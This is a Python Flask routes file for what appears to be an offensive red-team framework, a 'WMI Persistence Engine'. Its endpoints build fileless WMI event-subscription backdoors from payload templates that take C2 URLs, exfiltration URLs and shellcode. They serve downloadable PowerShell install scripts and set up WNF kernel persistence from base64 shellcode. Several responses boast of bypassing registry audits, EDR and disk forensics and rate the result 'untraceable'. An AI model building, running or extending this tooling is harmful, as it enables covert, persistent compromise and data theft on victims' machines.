"""
Flask routes for WMI Persistence Engine
Fileless Backdoor via WMI Event Subscriptions + WNF Kernel Persistence
"""

from flask import Blueprint, render_template, request, jsonify, send_file
import sys
import os
import io

# Add tools directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'tools'))

from wmi_persistence import (
    get_engine, TriggerType, ConsumerType, PayloadEncoding
)

# WNF Persistence import
try:
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'cybermodules'))
    from wnf_persistence import EliteWNFPersistence, WNF_NETWORK_STATE, WNF_WIFI_STATE, WNF_SCREEN_LOCK_STATE
except ImportError:
    EliteWNFPersistence = None
    WNF_NETWORK_STATE = 0x41C64E6DA3BC3C75
    WNF_WIFI_STATE = 0x41C64E6DA3BC3D75
    WNF_SCREEN_LOCK_STATE = 0x41C64E6DA3BC3E75

wmi_persistence_bp = Blueprint('wmi_persistence', __name__, url_prefix='/wmi-persistence')


@wmi_persistence_bp.route('/')
def index():
    """WMI Persistence Engine main page"""
    engine = get_engine()
    stats = engine.get_stats()
    profiles = engine.get_profiles()
    filters = engine.get_filters()
    consumers = engine.get_consumers()
    
    return render_template('wmi_persistence.html',
                           stats=stats,
                           profiles=profiles[:20],
                           filters=filters[:10],
                           consumers=consumers[:10],
                           trigger_types=[t.value for t in TriggerType],
                           consumer_types=[c.value for c in ConsumerType],
                           payload_templates=list(engine.PAYLOAD_TEMPLATES.keys()),
                           encodings=[e.value for e in PayloadEncoding])


@wmi_persistence_bp.route('/api/create-profile', methods=['POST'])
def create_profile():
    """Create a complete WMI persistence profile"""
    try:
        data = request.get_json()
        name = data.get('name', 'WMI_Persistence')
        trigger_type = data.get('trigger_type', 'startup')
        consumer_type = data.get('consumer_type', 'powershell')
        payload = data.get('payload')
        payload_template = data.get('payload_template')
        encoding = data.get('encoding', 'base64')
        stealth = data.get('stealth', True)
        
        # Additional params for templates
        params = {}
        for key in ['host', 'port', 'c2_url', 'interval', 'url', 'shellcode_b64', 
                    'path', 'patterns', 'exfil_url', 'process_name', 'service_name',
                    'hour', 'minute', 'path_pattern']:
            if key in data:
                params[key] = data[key]
        
        engine = get_engine()
        profile = engine.create_persistence_profile(
            name=name,
            trigger_type=TriggerType(trigger_type),
            consumer_type=ConsumerType(consumer_type),
            payload=payload,
            payload_template=payload_template,
            encoding=PayloadEncoding(encoding),
            stealth=stealth,
            **params
        )
        
        return jsonify({
            'success': True,
            'profile_id': profile.profile_id,
            'filter_name': profile.filter.name,
            'consumer_name': profile.consumer.name,
            'trigger': profile.filter.trigger_type.value,
            'install_script_preview': profile.install_script[:500] + '...'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@wmi_persistence_bp.route('/api/create-filter', methods=['POST'])
def create_filter():
    """Create a standalone event filter"""
    try:
        data = request.get_json()
        trigger_type = data.get('trigger_type', 'startup')
        name = data.get('name')
        custom_query = data.get('custom_query')
        
        # Query parameters
        params = {}
        for key in ['process_name', 'service_name', 'hour', 'minute', 'path_pattern']:
            if key in data:
                params[key] = data[key]
        
        engine = get_engine()
        event_filter = engine.create_event_filter(
            trigger_type=TriggerType(trigger_type),
            name=name,
            custom_query=custom_query,
            **params
        )
        
        return jsonify({
            'success': True,
            'filter_id': event_filter.filter_id,
            'name': event_filter.name,
            'query': event_filter.query,
            'trigger_type': event_filter.trigger_type.value
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@wmi_persistence_bp.route('/api/create-consumer', methods=['POST'])
def create_consumer():
    """Create a standalone event consumer"""
    try:
        data = request.get_json()
        consumer_type = data.get('consumer_type', 'powershell')
        payload = data.get('payload')
        payload_template = data.get('payload_template')
        name = data.get('name')
        encoding = data.get('encoding', 'base64')
        
        # Template parameters
        params = {}
        for key in ['host', 'port', 'c2_url', 'interval', 'url', 'shellcode_b64',
                    'path', 'patterns', 'exfil_url']:
            if key in data:
                params[key] = data[key]
        
        engine = get_engine()
        consumer = engine.create_event_consumer(
            consumer_type=ConsumerType(consumer_type),
            payload=payload,
            payload_template=payload_template,
            name=name,
            encoding=PayloadEncoding(encoding),
            **params
        )
        
        return jsonify({
            'success': True,
            'consumer_id': consumer.consumer_id,
            'name': consumer.name,
            'consumer_type': consumer.consumer_type.value,
            'encoded_payload_preview': consumer.encoded_payload[:100] + '...' if len(consumer.encoded_payload) > 100 else consumer.encoded_payload
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@wmi_persistence_bp.route('/api/get-profile/<profile_id>')
def get_profile(profile_id):
    """Get profile details including scripts"""
    try:
        engine = get_engine()
        profile = engine.get_profile(profile_id)
        
        if not profile:
            return jsonify({'success': False, 'error': 'Profile not found'}), 404
        
        return jsonify({
            'success': True,
            'profile': profile
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@wmi_persistence_bp.route('/api/download-install/<profile_id>')
def download_install_script(profile_id):
    """Download installation script for a profile"""
    try:
        engine = get_engine()
        profile = engine.get_profile(profile_id)
        
        if not profile:
            return jsonify({'success': False, 'error': 'Profile not found'}), 404
        
        script = profile.get('install_script', '')
        
        return send_file(
            io.BytesIO(script.encode()),
            mimetype='text/plain',
            as_attachment=True,
            download_name=f"install_{profile['name']}.ps1"
        )
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@wmi_persistence_bp.route('/api/download-remove/<profile_id>')
def download_remove_script(profile_id):
    """Download removal script for a profile"""
    try:
        engine = get_engine()
        profile = engine.get_profile(profile_id)
        
        if not profile:
            return jsonify({'success': False, 'error': 'Profile not found'}), 404
        
        script = profile.get('remove_script', '')
        
        return send_file(
            io.BytesIO(script.encode()),
            mimetype='text/plain',
            as_attachment=True,
            download_name=f"remove_{profile['name']}.ps1"
        )
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@wmi_persistence_bp.route('/api/detection-script')
def get_detection_script():
    """Get WMI persistence detection script"""
    try:
        engine = get_engine()
        script = engine.generate_detection_script()
        
        return jsonify({
            'success': True,
            'script': script
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@wmi_persistence_bp.route('/api/download-detection')
def download_detection_script():
    """Download detection script"""
    try:
        engine = get_engine()
        script = engine.generate_detection_script()
        
        return send_file(
            io.BytesIO(script.encode()),
            mimetype='text/plain',
            as_attachment=True,
            download_name="detect_wmi_persistence.ps1"
        )
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@wmi_persistence_bp.route('/api/profiles')
def list_profiles():
    """List all persistence profiles"""
    engine = get_engine()
    profiles = engine.get_profiles()
    return jsonify({'success': True, 'profiles': profiles})


@wmi_persistence_bp.route('/api/filters')
def list_filters():
    """List all event filters"""
    engine = get_engine()
    filters = engine.get_filters()
    return jsonify({'success': True, 'filters': filters})


@wmi_persistence_bp.route('/api/consumers')
def list_consumers():
    """List all event consumers"""
    engine = get_engine()
    consumers = engine.get_consumers()
    return jsonify({'success': True, 'consumers': consumers})


@wmi_persistence_bp.route('/api/trigger-types')
def list_trigger_types():
    """List available trigger types"""
    return jsonify({
        'success': True,
        'trigger_types': [
            {'value': t.value, 'name': t.name}
            for t in TriggerType
        ]
    })


@wmi_persistence_bp.route('/api/payload-templates')
def list_payload_templates():
    """List available payload templates"""
    engine = get_engine()
    return jsonify({
        'success': True,
        'templates': list(engine.PAYLOAD_TEMPLATES.keys())
    })


@wmi_persistence_bp.route('/api/stats')
def get_stats():
    """Get engine statistics"""
    engine = get_engine()
    return jsonify({'success': True, 'stats': engine.get_stats()})

# ========================================================================
# WNF (Windows Notification Facility) Persistence Routes
# Kernel-mode fileless persistence via undocumented WNF API
# ========================================================================

# Global WNF persistence instances
wnf_persistence_instances: dict = {}


@wmi_persistence_bp.route('/api/wnf/establish', methods=['POST'])
def wnf_establish():
    """
    Establish WNF kernel-mode fileless persistence
    
    POST /api/wnf/establish
    {
        "scan_id": "scan_xyz",
        "shellcode": "base64_encoded_payload",
        "trigger_event": "NETWORK",  // NETWORK, SCREEN_LOCK, WIFI, BLUETOOTH, POWER
        "persistent": true
    }
    
    Response:
    {
        "success": true,
        "scan_id": "scan_xyz",
        "persistence_type": "FILELESS - Kernel WNF Pool",
        "trigger_event": "NETWORK",
        "detection_bypasses": ["Registry audit", "Behavioral analysis", "Disk forensics", "Process creation monitoring"]
    }
    """
    if not EliteWNFPersistence:
        return jsonify({
            "success": False,
            "error": "WNF Persistence module not available"
        }), 501
    
    data = request.get_json() or {}
    scan_id = data.get('scan_id', f'wnf_scan_{os.urandom(4).hex()}')
    shellcode_b64 = data.get('shellcode', '')
    trigger_event = data.get('trigger_event', 'NETWORK')
    
    if not shellcode_b64:
        return jsonify({
            "success": False,
            "error": "shellcode parameter required"
        }), 400
    
    try:
        import base64
        shellcode = base64.b64decode(shellcode_b64)
        
        wnf = EliteWNFPersistence(
            scan_id=scan_id,
            logger=lambda msg: print(f"[WNF-{scan_id}] {msg}")
        )
        
        # Establish persistence
        if wnf.establish_persistence(shellcode, trigger_event):
            wnf_persistence_instances[scan_id] = wnf
            
            return jsonify({
                "success": True,
                "scan_id": scan_id,
                "persistence_type": "FILELESS - Kernel WNF Pool + Callback Execution",
                "trigger_event": trigger_event,
                "detection_bypasses": [
                    "Registry audit (zero registry writes)",
                    "Scheduled tasks (no task creation)",
                    "Behavioral EDR (meşru OS internal operation)",
                    "Disk forensics (kernel pool memory)",
                    "Process creation monitoring (kernel-triggered)",
                    "WMI audit (non-WMI persistence)"
                ],
                "persistence_mechanism": "Kernel WNF state subscriptions with undocumented NtSubscribeWnfStateData",
                "opsec_rating": "MUHASALANMAZ" # untraceable
            }), 201
        else:
            return jsonify({
                "success": False,
                "error": "Failed to establish WNF persistence"
            }), 500
    
    except Exception as e:
        return jsonify({
            "success": False,
            "error": f"Error establishing WNF persistence: {str(e)}"
        }), 500


@wmi_persistence_bp.route('/api/wnf/status/<scan_id>', methods=['GET'])
def wnf_status(scan_id: str):
    """Get WNF persistence status"""
    if scan_id not in wnf_persistence_instances:
        return jsonify({
            "success": False,
            "error": f"WNF persistence scan {scan_id} not found"
        }), 404
    
    try:
        wnf = wnf_persistence_instances[scan_id]
        status = wnf.get_status()
        
        return jsonify({
            "success": True,
            "scan_id": scan_id,
            "persistence_data": status,
            "opsec_indicators": {
                "registry_visibility": "ZERO",
                "disk_visibility": "ZERO",
                "process_visibility": "ZERO",
                "memory_forensic_visibility": "Kernel pool (generic)",
                "behavioral_signature": "Legitimate OS internal WNF state change"
            },
            "trigger_mechanism": "NtSubscribeWnfStateData + kernel callback on Wi-Fi/screen/power event"
        }), 200
    
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@wmi_persistence_bp.route('/api/wnf/trigger/<scan_id>', methods=['POST'])
def wnf_trigger(scan_id: str):
    """
    Manually trigger WNF persistence (emergency re-elevation)
    
    POST /api/wnf/trigger/scan_xyz
    {}
    
    Response:
    {
        "success": true,
        "scan_id": "scan_xyz",
        "payload_executed": true,
        "triggered_via": "NtUpdateWnfStateData state change notification"
    }
    """
    if scan_id not in wnf_persistence_instances:
        return jsonify({
            "success": False,
            "error": f"WNF persistence scan {scan_id} not found"
        }), 404
    
    try:
        wnf = wnf_persistence_instances[scan_id]
        
        if wnf.trigger_reelevation():
            return jsonify({
                "success": True,
                "scan_id": scan_id,
                "payload_executed": True,
                "triggered_via": "Kernel WNF state change callback",
                "message": "Persistence kernel callback executed"
            }), 200
        else:
            return jsonify({
                "success": False,
                "error": "Failed to trigger WNF callback"
            }), 500
    
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@wmi_persistence_bp.route('/api/wnf/list', methods=['GET'])
def wnf_list():
    """List all active WNF persistence instances"""
    try:
        active = []
        for scan_id, wnf in wnf_persistence_instances.items():
            try:
                status = wnf.get_status()
                active.append({
                    "scan_id": scan_id,
                    "persistence_status": status
                })
            except:
                pass
        
        return jsonify({
            "success": True,
            "active_wnf_instances": len(active),
            "instances": active
        }), 200
    
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


@wmi_persistence_bp.route('/api/wnf/event-types', methods=['GET'])
def wnf_event_types():
    """List available WNF trigger events"""
    return jsonify({
        "success": True,
        "trigger_events": [
            {
                "name": "NETWORK",
                "description": "Network connectivity changes (Wi-Fi/Ethernet)",
                "frequency": "Multiple times daily"
            },
            {
                "name": "SCREEN_LOCK",
                "description": "Screen lock/unlock events",
                "frequency": "Multiple times daily"
            },
            {
                "name": "WIFI",
                "description": "Wi-Fi AP connect/disconnect",
                "frequency": "Multiple times daily"
            },
            {
                "name": "BLUETOOTH",
                "description": "Bluetooth device connect/disconnect",
                "frequency": "Variable"
            },
            {
                "name": "POWER",
                "description": "Power state transitions (sleep/wake)",
                "frequency": "Multiple daily"
            }
        ],
        "persistence_notes": "Each event is meşru OS-internal & non-anomalous. EDR sees only legitimate system state changes."
    }), 200


@wmi_persistence_bp.route('/api/wnf/cleanup/<scan_id>', methods=['POST'])
def wnf_cleanup(scan_id: str):
    """Clean up WNF persistence instance"""
    if scan_id not in wnf_persistence_instances:
        return jsonify({
            "success": False,
            "error": f"WNF persistence scan {scan_id} not found"
        }), 404
    
    try:
        wnf = wnf_persistence_instances[scan_id]
        wnf.persistence.cleanup()
        del wnf_persistence_instances[scan_id]
        
        return jsonify({
            "success": True,
            "scan_id": scan_id,
            "message": "WNF persistence cleaned up"
        }), 200
    
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500